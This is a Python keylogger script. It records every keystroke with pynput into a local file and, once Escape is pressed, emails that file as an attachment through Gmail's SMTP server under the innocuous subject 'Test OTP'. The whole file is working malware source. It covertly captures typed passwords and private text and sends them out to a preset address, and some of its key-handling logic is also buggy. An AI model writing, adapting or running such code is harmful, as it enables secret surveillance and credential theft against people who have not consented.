import smtplib  # this library is for using the protocol to send the mail.

from email.message import EmailMessage  # this library is for sending the mail.

# To catch the Keystrokes of the keyboard.
from pynput.keyboard import Key, Listener

import credentials
# To import credentials from credentialy.py make sure you have provided correct credentials for the script to work properly.

from credentials import from_Email, password, to_Email

# to open Key_log.txt file. Where all the keystrokes will be saved.
f = open("Key_log.txt", "w+")
f.close()

keys_information = "Key_log.txt"
count = 0
keys = []


def send_email():  # this is mail sending function which will be called to send the mail.
    with open("Key_log.txt", "rb") as f:
        pdf_file = f.read()
        pdf_name = f.name

    msg = EmailMessage()
    msg["Subject"] = "Test OTP"  # Write the subject of you email here.
    msg["From"] = credentials.from_Email
    msg["To"] = credentials.to_Email

    msg.add_attachment(
        pdf_file, maintype="application", subtype="octet-stream", filename=pdf_name
    )  # for attaching text file to your mail.

    # This is predefined syntax  for using google's mail server. Nothing should be changed here.
    server = smtplib.SMTP_SSL("smtp.gmail.com", 465)
    server.login(from_Email, password)
    server.send_message(msg)
    server.quit()


def on_press(key):
    global keys, count
    print(key)
    keys.append(key)
    count += 1

    if count >= 1:
        count = 0
        write_file(keys)
        keys = []


def write_file(keys):
    with open(keys_information, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write(" ")
                f.close()
            elif (k.find("enter")):
                f.write("\n")
                f.write(k)
                f.close()
            elif (k in [
                "Key.f1",
                "Key.f2",
                "Key.f3",
                "Key.f4",
                "Key.f5",
                "Key.f6",
                "Key.f7",
                "Key.f8",
                "Key.f9",
                "Key.f10",
                "Key.f11",
                "Key.f12",
                "Key.insert",
                "Key.delete",
                "Key.tab",
                "Key.caps_lock",
                "Key.shift",
                "Key.ctrl_l",
                "Key.cmd",
                "Key.alt_l",
                "Key.space",
                "Key.ctrl_l",
                "Key.alt_gr",
                "Key.ctrl_r",
                "Key.page_up",
                "Key.up",
                "Key.left",
                "Key.down",
                "Key.right",
                "Key.page_down",
                "Key.shift_r",
                "Key.enter",
                "Key.backspace",
                    "Key.num_loc"]) > 0:
                f.write("\n")
                f.write(k)
                f.close()

            elif k.find("key") == -1:
                f.write(k)
                f.close()


def on_release(key):
    if key == Key.esc:
        send_email()  # calling function to send mail containing text file.
        return False


# Press the green button in the gutter to run the script.
if __name__ == '__main__':

    # See PyCharm help at https://www.jetbrains.com/help/pycharm/

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
